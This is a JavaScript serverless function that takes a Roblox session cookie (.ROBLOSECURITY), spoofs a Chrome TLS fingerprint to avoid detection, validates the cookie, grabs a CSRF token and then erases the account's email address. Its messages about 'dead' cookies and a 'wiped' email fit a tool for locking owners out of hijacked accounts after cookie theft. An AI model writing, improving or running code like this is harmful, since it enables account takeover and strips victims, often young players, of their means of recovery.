const { Session } = require('tls-client');

module.exports = async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') return res.status(200).end();

    const { cookie } = req.body;
    if (!cookie) return res.status(400).json({ success: false, message: 'Cookie is required.' });

    const cleanCookie = cookie.replace(/[^a-zA-Z0-9_\-|:.]/g, '');
    
    // Initialize a TLS session that mimics a real Chrome browser
    const session = new Session({ clientIdentifier: 'chrome_120' });

    const headers = {
        'Cookie': `.ROBLOSECURITY=${cleanCookie}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/plain, */*',
        'Origin': 'https://www.roblox.com',
        'Referer': 'https://www.roblox.com/'
    };

    try {
        // 1. Verify Cookie
        const authCheck = await session.get('https://users.roblox.com/v1/users/authenticated', { headers });
        
        if (authCheck.status !== 200) {
            return res.status(401).json({ success: false, message: 'Cookie is invalid or expired.' });
        }

        // 2. Get CSRF Token
        const csrfRes = await session.post('https://auth.roblox.com/v2/logout', { headers });
        const csrfToken = csrfRes.headers['x-csrf-token'];
        
        if (!csrfToken) {
            return res.status(400).json({ success: false, message: 'Failed to grab CSRF token. Cookie may be dead.' });
        }

        // 3. Wipe Email
        const wipeRes = await session.post('https://accountsettings.roblox.com/v1/email', {
            headers: { ...headers, 'X-CSRF-TOKEN': csrfToken },
            body: JSON.stringify({ emailAddress: "" })
        });

        if (wipeRes.status === 200) {
            return res.status(200).json({ success: true, data: { messages: ["Email successfully wiped."] } });
        } else if (wipeRes.status === 403) {
            return res.status(403).json({ success: false, message: "Blocked: Roblox requires password for this endpoint." });
        } else {
            return res.status(500).json({ success: false, message: `Failed: Status ${wipeRes.status}` });
        }

    } catch (error) {
        res.status(500).json({ success: false, message: `Error: ${error.message}` });
    }
}
